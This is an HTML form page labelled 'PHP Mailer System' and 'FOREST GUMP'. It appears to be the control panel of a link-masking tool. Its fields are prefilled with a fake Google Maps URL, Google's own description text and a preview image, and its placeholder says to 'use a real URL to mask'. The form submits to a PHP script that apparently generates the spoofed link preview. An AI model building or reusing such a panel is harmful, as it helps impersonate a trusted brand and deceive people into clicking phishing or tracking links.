<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PHP Mailer System</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
    <style>
        /* CSS design optimized for iPhones */
        body {
            font-family: Arial, sans-serif;
            font-size: 16px;
            color: #333333;
            background-color: #333333;
        }
        #container {
            width: 90%;
            max-width: 600px;
            margin: 0 auto;
            background-color: #ffffff;
            padding: 20px;
            border-radius: 5px;
        }
        input[type="text"],
        textarea {
            width: 100%;
            padding: 12px;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
            margin-top: 6px;
            margin-bottom: 16px;
            resize: vertical;
        }
        input[type="submit"] {
            background-color: #4CAF50;
            color: white;
            padding: 12px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background-color: #45a049;
        }
        .error {
            color: #ff0000;
        }
    </style>
</head>
<body>
    <div id="container">
        <form id="accesspanel" action="/public/Google/meta/040144.php" method="GET">
            <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
                <fieldset>
                    <center>
                        <div class="inset">
                            <h1 style="color: white; font-size: 48px;">FOREST GUMP</h1>
                            <h2 style="color: grey;">I THINK I &lt;3 U GENNY</h2>
                            <input type="text" name="title" id="title" placeholder="Title [use a real URL to mask]" value="https://www.google.ca/maps/place/city/Location=id453552354rtfwdc433w656gw5f3w6fw43" required="">
                            <input required="" type="text" name="description" id="description" placeholder="[Metadata Description]" value="Navigate your world faster and easier with Google Maps. Over 220 countries and territories mapped and hundreds of millions of businesses and places on the map. Get real-time GPS navigation, traffic, and transit info, and explore local neighborhoods by knowing where to eat, drink and go - no matter what part of the world you’re in.">
                            <input type="text" name="imageurl" id="imageurl" value="https://apdparts.ca/images/about/map-edmonton.jpg" placeholder="A 200x200 meta preview image URL" required="">
                            <br>
                            <input type="text" name="mod" id="mod" placeholder="To continue to Maps" value="Maps" required="">
                            <br>
                            <button type="submit" class="btn btn-primary btn-lg">[RUN FOREST]</button>
                        </div>
                    </center>
                </fieldset>
            </nav>
        </form>
    </div>
</body>
</html>